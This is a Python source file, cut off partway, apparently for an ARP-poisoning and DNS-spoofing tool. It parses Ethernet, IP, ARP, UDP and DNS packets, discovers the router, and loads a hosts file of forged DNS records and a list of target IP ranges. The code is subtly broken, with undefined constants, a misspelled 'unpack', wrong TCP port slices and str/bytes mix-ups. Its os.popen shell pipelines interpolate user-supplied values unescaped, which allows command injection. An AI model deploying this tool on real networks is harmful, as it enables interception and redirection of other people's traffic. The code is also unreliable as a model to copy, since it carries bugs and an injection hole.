#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import array
import atexit
import functools
import logging
import optparse
import os
import re
import socket
from struct import pack, unpack
import sys
import time
from threading import Thread

DISPLAYABLE_BROADCAST_MAC = ":".join(("ff", )*6)
BROADCAST_MAC = pack("!6B", *(255,)*6)
BROADCAST_IP = pack("!4B", *(255,)*4)
EMPTY_MAC = pack("!6B", *(0,)*6)
EMPTY_IP = pack("!4B", *(0,)*4)
RED, GREEN, ORANGE, BLUE, PURPLE, LBLUE, GREY = \
  map("\33[%dm".__mod__, range(31, 38))
IRED, IGREEN, IORANGE, IBLUE, IPURPLE, ILBLUE, IGREY = \
  map("\33[30;%dm".__mod__, range(41, 48))
DNS_COLOR = GREY
ARP_COLOR = PURPLE
NO_COLOR = "\33[m"


class Packet(object):

  """
  Represent any network packet. No matter what the protocols are.
  setitem and getitem accept only slices.
  These slices can be moved by a given offset:
  >>> packet = Packet("abcdefghijklmnop")
  >>> packet[0:4]
  abcd
  >>> packet[0:4,3] # equivalant to packet[0+3:4+3]
  defg
  """

  def __init__(self, raw_data=None):
    if raw_data is None:
      raw_data = b""
    self.raw_data = raw_data

  def __str__(self):
    return self.raw_data

  def __setitem__(self, index, item):
    if not isinstance(index, slice):
      index, offset = index
    else:
      offset = 0
    index = slice(index.start+offset, index.stop+offset)
    if len(self.raw_data) < index.stop:
      self.raw_data += b"\0" * (index.stop - len(self.raw_data))
    self.raw_data = \
      self.raw_data[:index.start] + item + self.raw_data[index.stop:]

  def __getitem__(self, index):
    if not isinstance(index, slice):
      index, offset = index
    else:
      offset = 0
    index = slice(
      index.start+offset,
      (len(self)+1 if index.stop is None else index.stop)+offset
    )
    return self.raw_data[index]

  def __len__(self):
    return len(self.raw_data)


class Layer3(Packet):

  """
  Third layer of the OSI model.
  Only Ethernet is implemented.
  Enternet methods prexif: eth_
  """

  ## ETH
  MAC_TARGET_SLICE = slice(0, 6)
  MAC_SOURCE_SLICE = slice(6, 12)
  PROTOCOL_SLICE = slice(12, 14)
  DEC = pack("!H", 0x6000)
  DEC2 = pack("!H", 0x0609)
  XNS = pack("!H", 0x0600)
  IPV4 = pack("!H", 0x0800)
  ARP = pack("!H", 0x0806)
  DOMAIN = pack("!H", 0x8019)
  RARP = pack("!H", 0x8035)
  APPLE_TALK = pack("!H", 0x809B)
  P_802_1Q = pack("!H", 0x8100)
  IPV6 = pack("!H", 0x86DD)

  @property
  def layer3_length(self):
    return 14

  @property
  def layer3_offset(self):
    return self.layer3_length

  @property
  def eth_mac_target(self):
    return self[Layer3.MAC_TARGET_SLICE]

  @eth_mac_target.setter
  def eth_mac_target(self, mac_target):
    self[Layer3.MAC_TARGET_SLICE] = mac_target

  @property
  def eth_mac_source(self):
    return self[Layer3.MAC_SOURCE_SLICE]

  @eth_mac_source.setter
  def eth_mac_source(self, mac_source):
    self[Layer3.MAC_SOURCE_SLICE] = mac_source

  @property
  def eth_data_protocol(self):
    return self[Layer3.PROTOCOL_SLICE]

  @eth_data_protocol.setter
  def eth_data_protocol(self, eth_data_protocol):
    self[Layer3.PROTOCOL_SLICE] = eth_data_protocol

  @property
  def contains_ipv4(self):
    return self.eth_data_protocol == Layer3.IPV4

  @property
  def contains_arp(self):
    return self.eth_data_protocol == Layer3.ARP

  @property
  def contains_ipv6(self):
    return self.eth_data_protocol == Layer3.IPV6


class Layer4(Layer3):

  """
  Fourth layer of the OSI model.
  Only IP+TCP/UDP and ARP are implemented.
  IP methods prexif: ip_
  TCP methods prexif: tcp_
  UDP methods prexif: udp_
  ARP methods prexif: arp_
  """

  ## IP
  IP_VERSION_SLICE = slice(0, 1)
  IP_DSF_SLICE = slice(1, 2)
  IP_TOTAL_LENGTH_SLICE = slice(2, 4)
  IP_IDENTIFICATION_SLICE = slice(4, 6)
  IP_FRAG_OFF_SLICE = slice(6, 8)
  IP_TTL_SLICE = slice(8, 9)
  IP_PROTOCOL_SLICE = slice(9, 10)
  TCP_PROTOCOL = pack("!B", 0x0006)
  UDP_PROTOCOL = pack("!B", 0x0011)
  IP_CKSM_SLICE = slice(10, 12)
  IP_IP_SOURCE_SLICE = slice(12, 16)
  IP_IP_TARGET_SLICE = slice(16, 20)

  ## UDP
  UDP_SOURCE_PORT = slice(0, 2)
  UDP_DESTINATION_PORT = slice(2, 4)
  UDP_LENGTH = slice(4, 6)
  UDP_CKSM = slice(6, 8)

  ## TCP
  TCP_SOURCE_PORT = slice(2, 4)
  TCP_DESTINATION_PORT = slice(2, 4)

  ## ARP
  ARP_NETWORK_TYPE_SLICE = slice(0, 2)
  ETHERNET = pack("!H", 0x0001)
  ARP_PROTOCOL_TYPE_SLICE = slice(2, 4)
  ARP_HW_ADDR_LENGTH_SLICE = slice(4, 5)
  ARP_SW_ADDR_LENGTH_SLICE = slice(5, 6)
  ARP_OPERATION_SLICE = slice(6, 8)
  ARP_MAC_SOURCE_SLICE = slice(8, 14)
  ARP_IP_SOURCE_SLICE = slice(14, 18)
  ARP_MAC_TARGET_SLICE = slice(18, 24)
  ARP_IP_TARGET_SLICE = slice(24, 28)
  ARP_REQUEST = pack("!H", 0x0001)
  ARP_RESPONSE = pack("!H", 0x0002)

  @property
  def layer4_ip_length(self):
    if self.contains_ipv4:
      ## ihl contains the number 32 bits words in the ip layer.
      return self.ip_ihl * 4
    elif self.contains_arp:
      ## ARP is always 28 bytes long
      return 28
    return 0

  @property
  def layer4_length(self):
    if self.contains_ipv4:
      if self.is_udp:
        return 8
      elif self.is_tcp:
        return self.tcp_length
    return 0

  @property
  def layer4_ip_offset(self):
    return self.layer3_offset + self.layer4_ip_length

  @property
  def layer4_offset(self):
    return self.layer4_ip_offset + self.layer4_length

  ## IP header

  @property
  def ip_version(self):
    return (self[Layer4.IP_VERSION_SLICE, self.layer3_offset][0] & 0b11110000) >> 4

  @ip_version.setter
  def ip_version(self, ip_version):
    self[Layer4.IP_VERSION_SLICE, self.layer3_offset] = (ip_version << 4) | self.ip_ihl

  @property
  def ip_ihl(self):
    return self[Layer4.IP_VERSION_SLICE, self.layer3_offset][0] & 0b00001111

  @ip_ihl.setter
  def ip_ihl(self, ip_ihl):
    self[Layer4.IP_VERSION_SLICE, self.layer3_offset] = (self.ip_version << 4) | ip_ihl

  @property
  def ip_dsf(self):
    return self[Layer4.IP_DSF_SLICE, self.layer3_offset]

  @ip_dsf.setter
  def ip_dsf(self, ip_dsf):
    self[Layer4.IP_DSF_SLICE, self.layer3_offset] = ip_dsf

  @property
  def ip_identification(self):
    return self[Layer4.IP_IDENTIFICATION_SLICE, self.layer3_offset]

  @ip_identification.setter
  def ip_identification(self, ip_identification):
    self[Layer4.IP_IDENTIFICATION_SLICE, self.layer3_offset] = ip_identification

  @property
  def ip_fragment_offset(self):
    return self[Layer4.IP_FRAG_OFF_SLICE, self.layer3_offset]

  @ip_fragment_offset.setter
  def ip_fragment_offset(self, ip_fragment_offset):
    self[Layer4.IP_FRAG_OFF_SLICE, self.layer3_offset] = ip_fragment_offset

  @property
  def ip_time_to_live(self):
    return self[Layer4.IP_TTL_SLICE, self.layer3_offset]

  @ip_time_to_live.setter
  def ip_time_to_live(self, ip_time_to_live):
    self[Layer4.IP_TTL_SLICE, self.layer3_offset] = ip_time_to_live

  @property
  def ip_protocol(self):
    return self[Layer4.IP_PROTOCOL_SLICE, self.layer3_offset]

  @ip_protocol.setter
  def ip_protocol(self, ip_protocol):
    self[Layer4.IP_PROTOCOL_SLICE, self.layer3_offset] = ip_protocol

  @property
  def ip_checksum(self):
    return self[Layer4.IP_CKSM_IP_SLICE, self.layer3_offset]

  @ip_checksum.setter
  def ip_checksum(self, ip_checksum):
    self[Layer4.IP_CKSM_IP_SLICE, self.layer3_offset] = ip_checksum

  @property
  def ip_ip_source(self):
    return self[Layer4.IP_IP_SOURCE_SLICE, self.layer3_offset]

  @ip_ip_source.setter
  def ip_ip_source(self, ip_ip_source):
    self[Layer4.IP_IP_SOURCE_SLICE, self.layer3_offset] = ip_ip_source

  @property
  def ip_ip_target(self):
    return self[Layer4.IP_IP_TARGET_SLICE, self.layer3_offset]

  @ip_ip_target.setter
  def ip_ip_target(self, ip_ip_target):
    self[Layer4.IP_IP_TARGET_SLICE, self.layer3_offset] = ip_ip_target

  ## ARP header

  @property
  def arp_network_type(self):
    return self[Layer4.ARP_NETWORK_TYPE_SLICE, self.layer3_offset]

  @arp_network_type.setter
  def arp_network_type(self, network_type):
    self[Layer4.ARP_NETWORK_TYPE_SLICE, self.layer3_offset] = network_type

  @property
  def arp_protocol_type(self):
    return self[Layer4.ARP_PROTOCOL_TYPE_SLICE, self.layer3_offset]

  @arp_protocol_type.setter
  def arp_protocol_type(self, protocol_type):
    self[Layer4.ARP_PROTOCOL_TYPE_SLICE, self.layer3_offset] = protocol_type

  @property
  def arp_hw_addr_length(self):
    return self[Layer4.ARP_HW_ADDR_LENGTH_SLICE, self.layer3_offset]

  @arp_hw_addr_length.setter
  def arp_hw_addr_length(self, hw_addr_length):
    self[Layer4.ARP_HW_ADDR_LENGTH_SLICE, self.layer3_offset] = hw_addr_length

  @property
  def arp_sw_addr_length(self):
    return self[Layer4.ARP_SW_ADDR_LENGTH_SLICE, self.layer3_offset]

  @arp_sw_addr_length.setter
  def arp_sw_addr_length(self, sw_addr_length):
    self[Layer4.ARP_SW_ADDR_LENGTH_SLICE, self.layer3_offset] = sw_addr_length

  @property
  def arp_operation(self):
    return self[Layer4.ARP_OPERATION_SLICE, self.layer3_offset]

  @arp_operation.setter
  def arp_operation(self, arp_operation):
    self[Layer4.ARP_OPERATION_SLICE, self.layer3_offset] = arp_operation

  @property
  def arp_mac_source(self):
    return self[Layer4.ARP_MAC_SOURCE_SLICE, self.layer3_offset]

  @arp_mac_source.setter
  def arp_mac_source(self, arp_mac_source):
    self[Layer4.ARP_MAC_SOURCE_SLICE, self.layer3_offset] = arp_mac_source

  @property
  def arp_ip_source(self):
    return self[Layer4.ARP_IP_SOURCE_SLICE, self.layer3_offset]

  @arp_ip_source.setter
  def arp_ip_source(self, arp_ip_source):
    self[Layer4.ARP_IP_SOURCE_SLICE, self.layer3_offset] = arp_ip_source

  @property
  def arp_mac_target(self):
    return self[Layer4.ARP_MAC_TARGET_SLICE, self.layer3_offset]

  @arp_mac_target.setter
  def arp_mac_target(self, arp_mac_target):
    self[Layer4.ARP_MAC_TARGET_SLICE, self.layer3_offset] = arp_mac_target

  @property
  def arp_ip_target(self):
    return self[Layer4.ARP_IP_TARGET_SLICE, self.layer3_offset]

  @arp_ip_target.setter
  def arp_ip_target(self, arp_ip_target):
    self[Layer4.ARP_IP_TARGET_SLICE, self.layer3_offset] = arp_ip_target

  @property
  def is_arp_request(self):
    return self.arp_operation == Layer4.ARP_REQUEST

  @property
  def is_arp_response(self):
    return self.arp_operation == Layer4.ARP_RESPONSE

  ## UDP header

  @property
  def is_udp(self):
    return self.ip_protocol == Layer4.UDP_PROTOCOL

  @property
  def udp_source_port(self):
    return self[Layer4.UDP_SOURCE_PORT, self.layer4_ip_offset]

  @udp_source_port.setter
  def udp_source_port(self, udp_source_port):
    self[Layer4.UDP_SOURCE_PORT, self.layer4_ip_offset] = udp_source_port

  @property
  def udp_destination_port(self):
    return self[Layer4.UDP_DESTINATION_PORT, self.layer4_ip_offset]

  @udp_destination_port.setter
  def udp_destination_port(self, udp_destination_port):
    self[Layer4.UDP_DESTINATION_PORT, self.layer4_ip_offset] = udp_destination_port

  @property
  def udp_length(self):
    return self[Layer4.UDP_LENGTH, self.layer4_ip_offset]

  @udp_length.setter
  def udp_length(self, udp_length):
    self[Layer4.UDP_LENGTH, self.layer4_ip_offset] = udp_length

  @property
  def udp_checksum(self):
    return self[Layer4.UDP_CKSM, self.layer4_ip_offset]

  @udp_checksum.setter
  def udp_checksum(self, udp_checksum):
    self[Layer4.UDP_CKSM, self.layer4_ip_offset] = udp_checksum

  def set_udp_checksum(self, data_length):
    self.udp_checksum = self.udp_computed_checksum

  @property
  def udp_computed_checksum(self):
    stop = Layer4.UDP_CKSM.stop + self.layer4_ip_offset
    data = \
      self.ip_ip_source + \
      self.ip_ip_target + \
      b"\x00\x11" + \
      self.udp_length + \
      self.udp_source_port + \
      self.udp_destination_port + \
      self.udp_length + \
      b"\x00\x00" + \
      self.raw_data[stop:]
    return pack("!H", checksum(data))

  ## TCP header

  @property
  def is_tcp(self):
    return self.ip_protocol == Layer4.TCP_PROTOCOL

  @property
  def tcp_source_port(self):
    return self[Layer4.TCP_SOURCE_PORT, self.layer4_ip_offset]

  @tcp_source_port.setter
  def tcp_source_port(self, tcp_source_port):
    self[Layer4.TCP_SOURCE_PORT, self.layer4_ip_offset] = tcp_source_port

  @property
  def tcp_destination_port(self):
    return self[Layer4.TCP_DESTINATION_PORT, self.layer4_ip_offset]

  @tcp_destination_port.setter
  def tcp_destination_port(self, tcp_destination_port):
    self[Layer4.TCP_DESTINATION_PORT, self.layer4_ip_offset] = tcp_destination_port

  @property
  def tcp_sequence_number(self):
    return self[Layer4.TCP_SEQUENCE_NUMBER, self.layer4_ip_offset]

  @tcp_sequence_number.setter
  def tcp_sequence_number(self, tcp_sequence_number):
    self[Layer4.TCP_SEQUENCE_NUMBER, self.layer4_ip_offset] = tcp_sequence_number

  @property
  def tcp_ack_number(self):
    return self[Layer4.TCP_ACK_NUMBER, self.layer4_ip_offset]

  @tcp_ack_number.setter
  def tcp_ack_number(self, tcp_ack_number):
    self[Layer4.TCP_ACK_NUMBER, self.layer4_ip_offset] = tcp_ack_number

  @property
  def tcp_header_length(self):
    return self[Layer4.TCP_HEADER_LENGTH, self.layer4_ip_offset]

  @tcp_header_length.setter
  def tcp_header_length(self, tcp_header_length):
    self[Layer4.TCP_HEADER_LENGTH, self.layer4_ip_offset] = tcp_header_length

  @property
  def tcp_flags(self):
    return self[Layer4.TCP_FLAGS, self.layer4_ip_offset]

  @tcp_flags.setter
  def tcp_flags(self, tcp_flags):
    self[Layer4.TCP_FLAGS, self.layer4_ip_offset] = tcp_flags

  @property
  def tcp_window_size(self):
    return self[Layer4.TCP_WINDOW_SIZE, self.layer4_ip_offset]

  @tcp_window_size.setter
  def tcp_window_size(self, tcp_window_size):
    self[Layer4.TCP_WINDOW_SIZE, self.layer4_ip_offset] = tcp_window_size

  @property
  def tcp_cksm(self):
    return self[Layer4.TCP_CKSM, self.layer4_ip_offset]

  @tcp_cksm.setter
  def tcp_cksm(self, tcp_cksm):
    self[Layer4.TCP_CKSM, self.layer4_ip_offset] = tcp_cksm

  @property
  def tcp_urgent_pointer(self):
    return self[Layer4.TCP_URGENT_POINTER, self.layer4_ip_offset]

  @tcp_urgent_pointer.setter
  def tcp_urgent_pointer(self, tcp_urgent_pointer):
    self[Layer4.TCP_URGENT_POINTER, self.layer4_ip_offset] = tcp_urgent_pointer

  @property
  def tpc_has_options(self):
    ## 32, usualy. Because optns = 12
    return unpach("!B", self.tcp_header_length)[0] > 20

  @property
  def tcp_options(self):
    return self[Layer4.TCP_OPTIONS, self.layer4_ip_offset]

  @tcp_options.setter
  def tcp_options(self, tcp_options):
    self[Layer4.TCP_OPTIONS, self.layer4_ip_offset] = tcp_options

  @property
  def tcp_data(self):
    return self[Layer4.TCP_DATA, self.layer4_ip_offset]

  @tcp_data.setter
  def tcp_data(self, tcp_data):
    self[Layer4.TCP_DATA, self.layer4_ip_offset] = tcp_data


class Layer5(Layer4):

  """
  For the sake of ascending compatibility, I implement the Layer 5, 
  even if it is never used.
  """

  @property
  def layer5_length(self):
    return 0

  @property
  def layer5_offset(self):
    return self.layer4_offset + self.layer5_length


class Layer6(Layer5):

  """
  For the sake of ascending compatibility, I implement the Layer 6, 
  even if it is never used.
  """

  @property
  def layer6_length(self):
    return 0

  @property
  def layer6_offset(self):
    return self.layer5_offset + self.layer6_length


class Layer7(Layer6):

  """
  Seventh layer of the OSI model.
  Only DNS is implemented.
  DNS methods prexif: dns_
  """

  ## DNS OLD VALUES. NEED TO BE CHANGED
  DNS_PORT = pack("!H", 0x0035)
  DNS_TRANS_ID_SLICE = slice(0, 2)
  DNS_FLAGS_SLICE = slice(2, 4)
  DNS_QUERY = 0
  DNS_RESPONSE = 1
  DNS_QUESTIONS_SLICE = slice(4, 6)
  DNS_ANSWER_RRS_SLICE = slice(6, 8)
  DNS_AUTHORITY_RRS_SLICE = slice(8, 10)
  DNS_ADD_RRS_SLICE = slice(10, 12)

  @property
  def is_dns(self):
    return \
      self.contains_ipv4 and \
      self.has_dns_port and \
      self.udp_checksum == self.udp_computed_checksum

  @property
  def has_dns_port(self):
    if self.is_tcp:
      return self.tcp_destination_port == Layer7.DNS_PORT
    elif self.is_udp:
      return self.udp_destination_port == Layer7.DNS_PORT
    return False

  @property
  def dns_trans_id(self):
    return self[Layer7.DNS_TRANS_ID_SLICE, self.layer6_offset]

  @dns_trans_id.setter
  def dns_trans_id(self, trans_id):
    self[Layer7.DNS_TRANS_ID_SLICE, self.layer6_offset] = trans_id

  @property
  def is_dns_query(self):
    return (unpack("!2B", self.dns_flags)[0] >> 7) == 0

  @property
  def is_dns_answer(self):
    return (unpack("!2B", self.dns_flags)[0] >> 7) == 1

  @property
  def dns_flags(self):
    return self[Layer7.DNS_FLAGS_SLICE, self.layer6_offset]

  @dns_flags.setter
  def dns_flags(self, flags):
    self[Layer7.DNS_FLAGS_SLICE, self.layer6_offset] = flags

  @property
  def dns_questions(self):
    return self[Layer7.DNS_QUESTIONS_SLICE, self.layer6_offset]

  @dns_questions.setter
  def dns_questions(self, questions):
    self[Layer7.DNS_QUESTIONS_SLICE, self.layer6_offset] = questions

  @property
  def dns_answer_rrs(self):
    return self[Layer7.DNS_ANSWER_RRS_SLICE, self.layer6_offset]

  @dns_answer_rrs.setter
  def dns_answer_rrs(self, answer_rrs):
    self[Layer7.DNS_ANSWER_RRS_SLICE, self.layer6_offset] = answer_rrs

  @property
  def dns_authority_rrs(self):
    return self[Layer7.DNS_AUTHORITY_RRS_SLICE, self.layer6_offset]

  @dns_authority_rrs.setter
  def dns_authority_rrs(self, authority_rrs):
    self[Layer7.DNS_AUTHORITY_RRS_SLICE, self.layer6_offset] = authority_rrs

  @property
  def dns_additionnal_rrs(self):
    return self[Layer7.DNS_ADD_RRS_SLICE, self.layer6_offset]

  @dns_additionnal_rrs.setter
  def dns_additionnal_rrs(self, additionnal_rrs):
    self[Layer7.DNS_ADD_RRS_SLICE, self.layer6_offset] = additionnal_rrs

  @property
  def dns_data(self):
    return DNSData(self.raw_data)

  @property
  def dns_queries(self):
    return DNSData.parse_queries(self)

  @dns_queries.setter
  def dns_queries(self, queries):
    self[DNSData.parse_queries_slice(self), self.layer6_offset] = queries

  @property
  def dns_answers(self):
    return DNSData.parse_answers(self)

  @dns_answers.setter
  def dns_answers(self, answers):
    self[DNSData.parse_answers_slice(self), self.layer6_offset] = answers

  @property
  def dns_additional_records(self):
    return DNSData.parse_add_recors(self)

  @dns_additional_records.setter
  def dns_additional_records(self, additional_records):
    self[DNSData.parse_add_records_slice(self), self.layer6_offset] = additional_records


class DNSData(object):

  """
  DNS rr section parser.
  Slices' offset is the begining of the DNS rr.
  """

  ## ANSWER AND QUERY
  DNS_IP_TYPE_SLICE = slice(0, 2)             ## AFTER NAME.
  DNS_CLASS_SLICE = slice(2, 4)               ## AFTER NAME.
  ## ANSWER ONLY
  DNS_TTL_SLICE = slice(4, 8)                 ## AFTER NAME.
  DNS_DATA_LENGTH_SLICE = slice(8, 10)        ## AFTER NAME.
  DNS_IP_SLICE = slice(10, 14)                ## AFTER NAME.

  DNS_A_TYPE = pack("!H", 0x0001)             ## ASK FOR IPV4 
  DNS_AAAA_TYPE = pack("!H", 0x001c)          ## ASK FOR IPV6
  DNS_IN_CLASS = pack("!H", 0x0001)           ## REGULAR DNS QUERY
  ## HIGH TTL MUST NOT EXCEED 1 WEEK: RFC 1035
  DNS_TTL_HIGH_VALUE = pack("!I", 0x1517f)    ## 23h 59m 59s

  @staticmethod
  def parse_queries_slice(layer7):
    amount = unpack("!H", layer7.dns_questions)[0]
    offset = layer7.layer6_offset
    start = stop = Layer7.DNS_ADD_RRS_SLICE.stop+offset
    for _ in range(amount):
      stop += layer7[stop:].index(b"\0")+1
    return slice(start-offset, stop-offset)

  @staticmethod
  def parse_answers_slice(layer7):
    amount = unpack("!H", layer7.dns_answer_rrs)[0]
    offset = layer7.layer6_offset
    start = stop = \
      DNSData.parse_queries_slice(layer7).stop+offset
    for _ in range(amount):
      # a pointer
      if unpack("!B", layer7[stop])[0] & 0b11000000:
        stop += 16
      else:
        # name length + 14 (= other fields)
        stop += layer7[stop:].index("\0") + 1 + 14
    return slice(start-offset, stop-offset)

  @staticmethod
  def parse_add_records_slice(layer7):
    return \
      slice(DNSData.parse_answers_slice(layer7).stop, len(layer7))

  def __init__(self, layer7):
    dns_offset = layer7.layer6_offset
    self._pre_data = layer7[dns_offset:dns_offset+12]
    self.update_slices(layer7)

  def update_slices(self, layer7):
    offset = layer7.layer6_offset
    self._queries = layer7[DNSData.parse_queries_slice(layer7), offset]
    self._answers = layer7[DNSData.parse_answers_slice(layer7), offset]
    self._add_records = layer7[DNSData.parse_add_records_slice(layer7), offset]

  @property
  def raw_data(self):
    return b''.join((
      self._pre_data, self.queries, self.answers, self.add_records
    ))

  @property
  def queries_slice(self):
    return slice(0, len(self.queries))

  @property
  def queries(self):
    return self._queries

  @queries.setter
  def queries(self, queries):
    self._queries = queries

  @property
  def query_name(self):
    data = self.queries
    domain_components = []
    index = 0
    length = data[0]
    while length or not index:
      domain_components.append(data[index+1:index+1+length])
      index += length+1
      length = data[index]
    return b'.'.join(domain_components)

  @property
  def answers_slice(self):
    start = self.queries_slice.stop
    return slice(start, start+len(self.answers))

  @property
  def answers(self):
    return self._answers

  @answers.setter
  def answers(self, answers):
    self._answers = answers

  @property
  def add_records_slice(self):
    start = self.answers_slice.stop
    return slice(start, start+len(self.add_records))

  @property
  def add_records(self):
    return self._add_records

  @add_records.setter
  def add_records(self, add_records):
    self._add_records = add_records


class Context(object):

  """
  The global context of the program.
  Contains parameters, options, arp table.
  Has reference to the DNS and ARP spoofers.
  Also allow to gather some info.
  """

  def __init__(self, device, options):
    self.device = device
    self.options = options
    self.arp_table = {}
    self.dns_spoofer = None
    self.arp_poisoner = None
    self.dns_records = {}
    self.targets_regex = set()
    self.targets_ips = None
    self.check_parameters()
    self.gather_informations()
    self.parse_hosts()
    self.parse_targets()

  @property
  def broadcast_ip(self):
    return self._broadcast_ip

  @broadcast_ip.setter
  def broadcast_ip(self, broadcast_ip):
    self._broadcast_ip = broadcast_ip

  @property
  def broadcast_mac(self):
    return DISPLAYABLE_BROADCAST_MAC

  @property
  def ip(self):
    return self._ip

  @ip.setter
  def ip(self, ip):
    self._ip = ip

  @property
  def mac(self):
    return self._mac

  @mac.setter
  def mac(self, mac):
    self._mac = mac

  @property
  def router_ip(self):
    if self.options.router_ip:
      return self.options.router_ip
    return self._router_ip

  @router_ip.setter
  def router_ip(self, ip):
    self._router_ip = ip

  @property
  def router_mac(self):
    if self.options.router_mac:
      return self.options.router_mac
    if time.time() - self.last_router_mac_update > 3600:
      self.guess_router_mac()
    return self.arp_table[self.router_ip][0]

  @property
  def last_router_mac_update(self):
    return self.arp_table[self.router_ip][1]

  @router_mac.setter
  def router_mac(self, mac):
    self.arp_table[self.router_ip] = (mac or None, time.time())

  @property
  def dns_ip(self):
    if self.options.dns_ip is None:
      return self.ip
    return self.options.dns_ip

  def guess_router_mac(self):
    cmd = " | ".join((
      "arp -n %(router_ip)s 2> /dev/null",  # show arp table
      "grep -Po '(\S+\s+){2}%(device)s'",  # filter on device
      "cut -d' ' -f1"                       # get first part
    )) % {
      "router_ip": self.router_ip,
      "device": self.device,
    }
    self.router_mac = os.popen(cmd).read().strip()

  def gather_informations(self):
    self.ip = self.detect_self_ip()
    self.mac = self.detect_self_mac()
    self.broadcast_ip = self.detect_broadcast_ip()
    if self.ip:
      logger.info("Detecting our IP     ... %s" % self.ip)
    else:
      logger.critical("Could not detect our own IP.")
    if self.mac:
      logger.info("Detecting our MAC    ... %s" % self.mac)
    else:
      logger.critical("Could not detect our own MAC.")
    if self.options.router_ip is None:
      self.router_ip = self.detect_router_ip()
      if self.router_ip:
        logger.info("Detecting router IP  ... %s" % self.router_ip)
      else:
        logger.critical("Could not find router IP.")
    if self.options.router_mac is None:
      self.router_mac = self.detect_router_mac()
      if self.router_mac:
        logger.info("Detecting router MAC ... %s" % self.router_mac)
      else:
        logger.info("Could not find router MAC. Trying later with ARP.")

  def detect_broadcast_ip(self):
    cmd = " | ".join((
      "ip address show %(device)s", # show device info
      "grep -Po 'inet.*brd\s\S+'",  # filter on "Bcast" word
      "cut -d' ' -f4"               # get second part
    )) % {
      "device": self.device,
    }
    return os.popen(cmd).read().strip()

  def detect_self_ip(self):
    cmd = " | ".join((
      "ip address show %(device)s", # show device info
      "grep -Po 'inet\s+[^/\s]+'",  # filter on "inet" word
      "cut -d' ' -f2"               # get second part
    )) % {
      "device": self.device,
    }
    return os.popen(cmd).read().strip()

  def detect_self_ipv6(self):
    cmd = " | ".join((
      "ip address show %(device)s", # show device info 
      "grep -Po 'inet6\s+[^/\s]+'", # filter on "inet6" word
      "cut -d' ' -f2"               # get second part
    )) % {
      "device": self.device,
    }
    return os.popen(cmd).read().strip()

  def detect_self_mac(self):
    cmd = " | ".join((
      "ip address show %(device)s", # show device info 
      "grep -Po 'ether\s+\S+'",     # filter on "ether" word
      "cut -d' ' -f2"               # get second part
    )) % {
      "device": self.device,
    }
    return os.popen(cmd).read().strip()

  def detect_router_mac(self):
    if self.options.router_mac:
      return self.options.router_mac
    cmd = " | ".join((
      "arp -n %(router_ip)s 2> /dev/null",  # show arp table
      "grep -Po '(\S+\s+){2}%(device)s'",  # filter on device
      "cut -d' ' -f1"                       # get first part
    )) % {
      "router_ip": self.router_ip,
      "device": self.device,
    }
    return os.popen(cmd).read().strip()

  def get_possible_devices(self):
    return os.popen(" | ".join((
      "ip link show",               # show interfaces
      "grep -oP '\d+:\s+([^:]+)'",  # select 'number: intf'
      "cut -d' ' -f2"               # split and get just 'intf'
    ))).read().strip().split("\n")  # split on \n, ignoring trailing

  def detect_router_ip(self):
    return os.popen(" | ".join((
      "route -n",                       # show routing table
      "grep -Po '(\S+\s+){2}[UG]{2}'",  # filter on U(p)G(ateaway)
      "cut -d' ' -f1"                   # get first part
    ))).read().strip()

  def chech_everything(self):
    self.check_mandatory()
    self.check_options()

  def check_parameters(self):
    self.check_device()
    self.check_hosts()
    self.check_targets()
    self.check_pid_path()
    self.check_router_ip()
    self.check_router_mac()
    self.check_arp_options()
    self.check_dns_options()

  def check_device(self):
    if self.device not in self.get_possible_devices():
      logger.critical(
        "Bad device name: %s. Expected one of those: %s" % (
          self.device, ", ".join(self.get_possible_devices())
        )
      )
    logger.debug("%-15s%-20s [OK]" % ("Device:", self.device))
    if not self.detect_self_ip():
      logger.critical(
        "You're not connected to any network with this device"
      )
    if not self.detect_self_mac():
      logger.critical(
        "Could not get the mac adress associated to your device"
      )

  def check_hosts(self):
    if not os.path.exists(self.options.hosts):
      logger.critical("%s does not exists." % self.options.hosts)
    elif not os.path.getsize(self.options.hosts):
      logger.critical("Empty host file")
    logger.debug("%-15s%-20s [OK]" % ("Hosts:", self.options.hosts[-17:]))

  def check_targets(self):
    if not os.path.exists(self.options.targets):
      logger.critical("%s does not exists." % self.options.targets)
    elif not os.path.getsize(self.options.targets):
      logger.critical("Empty targets file")
    logger.debug("%-15s%-20s [OK]" % ("Targets:", self.options.targets[-17:]))

  def check_pid_path(self):
    pass

  def check_router_ip(self):
    if self.options.router_ip is not None:
      if not match_ipv4(self.options.router_ip):
        logger.critical("Bad router IP adress.")
      logger.debug("%-15s%-20s [OK]" % ("Router IP:", self.options.router_ip))

  def check_router_mac(self):
    if self.options.router_mac is not None:
      if not match_mac(self.options.router_mac):
        logger.critical("Bad router MAC adress.")
      logger.debug("%-15s%-20s [OK]" % ("Router MAC:", self.options.router_mac))

  def check_arp_options(self):
    pass

  def check_dns_options(self):
    self.check_dns_ip()

  def check_dns_ip(self):
    if self.options.dns_ip is not None:
      if not match_ipv4(self.options.dns_ip):
        logger.error("Bad router IP adress.")
      logger.debug("%-15s%-20s [OK]" % ("DNS IP:", self.options.dns_ip))

  def parse_hosts(self):
    with open(self.options.hosts) as hosts_file:
      for line in hosts_file.readlines():
        line = re.split("\s+", line.split("#")[0])
        if len(line) == 2:
          self.dns_records[line[0]] = line[1]

  def parse_targets(self):
    """
    This part of the program is becomming huge and out of purpose.
    I should create an IP class and IPRange class to manipulate
    more easily IPs.
    It uses `complement_ip`, `get_target_ips` and the
    `is_valid_target` method is also involved in ip range
    calculation... There's too much out-of-purpose code, here.
    """
    with open(self.options.targets) as targets_file:
      for line in targets_file.readlines():
        line = line.split("#")[0].replace("\n", '')
        if line:
          ip = self.complement_ip(line)
          self.targets_regex.add(ip.replace("*", "1-254"))
    self.targets_ips = self.get_target_ips()

  def complement_ip(self, line):
    """
    Complement the IP if it is the short notation:
    .64 gives 192.168.1.64 if our IP begins with "192.168.1"
    """
    if line.startswith("."):
      index = 0
      for _ in range(4-line.count(".")):
        index = self.ip.index(".", index)+1
      return self.ip[:index] + line[1:]
    return line

  def get_target_ips(self):
    targets = set()
    for target in self.targets_regex:
      parts = []
      for ip_part in target.split("."):
        if "-" in ip_part:
          try:
            begin, end = map(int, ip_part.split("-"))
          except ValueError:
            break
          if begin > end:
            begin, end = end, begin
          if 0 < end < 255:
            parts.append(list(map(str, range(begin, end+1))))
        else:
          try:
            if 0 < int(ip_part) < 255:
              parts.append([ip_part])
          except ValueError:
            break
      if len(parts) != 4:
        continue
      # If the total number of IPs > 255, we stop storing IPs.
